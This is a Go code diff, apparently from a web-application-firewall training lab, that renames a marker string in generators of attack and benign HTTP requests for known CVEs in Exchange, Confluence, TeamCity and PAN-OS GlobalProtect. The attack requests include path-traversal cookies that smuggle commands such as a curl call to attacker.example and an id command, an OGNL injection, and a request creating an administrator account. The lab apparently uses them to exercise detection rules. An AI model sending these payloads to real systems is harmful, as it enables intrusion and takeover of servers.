@@ -76,7 +76,7 @@ func registerLabCVEs() {
 		},
 		Patterns: []Pattern{
 			{Attack, T("X-BEResource で転送", "Forwarding with X-BEResource"), 12, func(r *rand.Rand) Request {
-				return withCookie(atk(r, post(r, "/ecp/wafdy.js", "")), "X-BEResource=localhost/EWS/Exchange.asmx?a=~1942062522; X-AnonResource=true")
+				return withCookie(atk(r, post(r, "/ecp/wafdojo.js", "")), "X-BEResource=localhost/EWS/Exchange.asmx?a=~1942062522; X-AnonResource=true")
 			}},
 			{Attack, T("X-AnonResource-Backend で転送", "Forwarding with X-AnonResource-Backend"), 12, func(r *rand.Rand) Request {
 				return withCookie(atk(r, get(r, "/owa/auth/x.js", "")), "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3")
@@ -86,7 +86,7 @@ func registerLabCVEs() {
 			}},
 			{Benign, T("Outlook on the web の正規の Cookie", "Legitimate Outlook on the web cookies"), 25, func(r *rand.Rand) Request {
 				return withCookie(get(r, pick(r, []string{"/owa/", "/ecp/", "/owa/auth/logon.aspx"}), ""),
-					"X-BackEndCookie=S-1-5-21-123=u56Lnp2ejJqByZrGzsjJx8vSnMbIy9LLyc7L; X-OWA-CANARY=wafdyCanary0123456789")
+					"X-BackEndCookie=S-1-5-21-123=u56Lnp2ejJqByZrGzsjJx8vSnMbIy9LLyc7L; X-OWA-CANARY=wafdojoCanary0123456789")
 			}},
 			{Benign, lblBrowse, 20, browse},
 		},
@@ -121,13 +121,13 @@ func registerLabCVEs() {
 		},
 		Patterns: []Pattern{
 			{Attack, T("PoC そのまま", "The PoC as published"), 12, func(r *rand.Rand) Request {
-				return atk(r, post(r, "/template/aui/text-inline.vm", "label=\\u0027%2b#request['wafdy']%2b\\u0027"))
+				return atk(r, post(r, "/template/aui/text-inline.vm", "label=\\u0027%2b#request['wafdojo']%2b\\u0027"))
 			}},
 			{Attack, T("コンテキストパス付き", "With a context path"), 12, func(r *rand.Rand) Request {
-				return atk(r, post(r, "/confluence/template/aui/text-inline.vm", "label=\\u0027%2b#request.get('wafdy')%2b\\u0027"))
+				return atk(r, post(r, "/confluence/template/aui/text-inline.vm", "label=\\u0027%2b#request.get('wafdojo')%2b\\u0027"))
 			}},
 			{Attack, T("GET で呼び出す", "Called with GET"), 12, func(r *rand.Rand) Request {
-				return atk(r, get(r, "/template/aui/text-inline.vm", "label=wafdy-test"))
+				return atk(r, get(r, "/template/aui/text-inline.vm", "label=wafdojo-test"))
 			}},
 			{Benign, T("vm を含むドキュメント", "Documentation containing vm"), 25, func(r *rand.Rand) Request {
 				return get(r, pick(r, []string{"/docs/vm-guide", "/download/archive.vm.zip", "/pages/viewpage.action", "/display/OPS/vmware"}), "")
@@ -233,13 +233,13 @@ func registerLabCVEs() {
 				return atk(r, get(r, "/hax", "jsp=/app/rest/server;.jsp"))
 			}},
 			{Attack, T("管理者の作成", "Creating an administrator"), 10, func(r *rand.Rand) Request {
-				req := withBody(atk(r, post(r, "/wafdy", "")), "application/json", `{"username":"wafdy","password":"wafdy-test","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}`)
+				req := withBody(atk(r, post(r, "/wafdojo", "")), "application/json", `{"username":"wafdojo","password":"wafdojo-test","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}`)
 				req.RawQuery = "jsp=/app/rest/users;.jsp"
 				return req
 			}},
 			{Attack, T("アクセストークンの作成", "Creating an access token"), 10, func(r *rand.Rand) Request {
 				req := atk(r, post(r, "/pwned", ""))
-				req.RawQuery = "jsp=/app/rest/users/id:1/tokens/wafdy;.jsp"
+				req.RawQuery = "jsp=/app/rest/users/id:1/tokens/wafdojo;.jsp"
 				return req
 			}},
 			{Attack, T("; をエンコード", "Encoded semicolon"), 10, func(r *rand.Rand) Request {
@@ -277,8 +277,8 @@ func registerLabCVEs() {
 		Briefing: []Text{
 			T("Palo Alto Networks の PAN-OS (GlobalProtect) で、SESSID Cookie の値がそのままファイルのパスとして使われていました。値にディレクトリの遡りを入れると任意の場所に空のファイルを作れ、ファイル名にコマンドを埋め込むと、定期的に動く処理がそれを実行してしまいます。",
 				"In Palo Alto Networks PAN-OS (GlobalProtect), the SESSID cookie value was used directly as a file path. Putting a directory climb in the value creates an empty file anywhere, and embedding a command in the file name gets it executed by a periodic job."),
-			T("観測された PoC: Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy`curl${IFS}attacker.example`",
-				"Observed PoC: Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy`curl${IFS}attacker.example`"),
+			T("観測された PoC: Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdojo`curl${IFS}attacker.example`",
+				"Observed PoC: Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdojo`curl${IFS}attacker.example`"),
 		},
 		Conditions: []Text{
 			T("今回は防ぎ方の情報がありません。ファイルを作るだけの攻撃 (遡りのみ) と、コマンドを埋め込む攻撃があります。",
@@ -294,16 +294,16 @@ func registerLabCVEs() {
 		},
 		Patterns: []Pattern{
 			{Attack, T("PoC そのまま (遡り + バッククォート)", "The PoC as published (climb + backticks)"), 8, func(r *rand.Rand) Request {
-				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy`curl${IFS}attacker.example`")
+				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdojo`curl${IFS}attacker.example`")
 			}},
 			{Attack, T("ファイルを作るだけ (遡りのみ)", "Only creating a file (climb only)"), 8, func(r *rand.Rand) Request {
-				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/wafdy.txt")
+				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/wafdojo.txt")
 			}},
 			{Attack, T("$( ) によるコマンド置換", "Command substitution with $( )"), 8, func(r *rand.Rand) Request {
-				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "lang=en; SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/w$(id>/tmp/wafdy)")
+				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "lang=en; SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/w$(id>/tmp/wafdojo)")
 			}},
 			{Attack, T("Cookie 名を小文字で", "Cookie name in lowercase"), 8, func(r *rand.Rand) Request {
-				return withCookie(atk(r, post(r, "/global-protect/login.esp", "")), "sessid=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy")
+				return withCookie(atk(r, post(r, "/global-protect/login.esp", "")), "sessid=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdojo")
 			}},
 			{Benign, T("正規の VPN 接続", "Legitimate VPN connections"), 25, func(r *rand.Rand) Request {
 				return withCookie(post(r, "/ssl-vpn/hipreport.esp", ""), fmt.Sprintf("SESSID=%016x; lang=ja-JP", r.Uint64()))
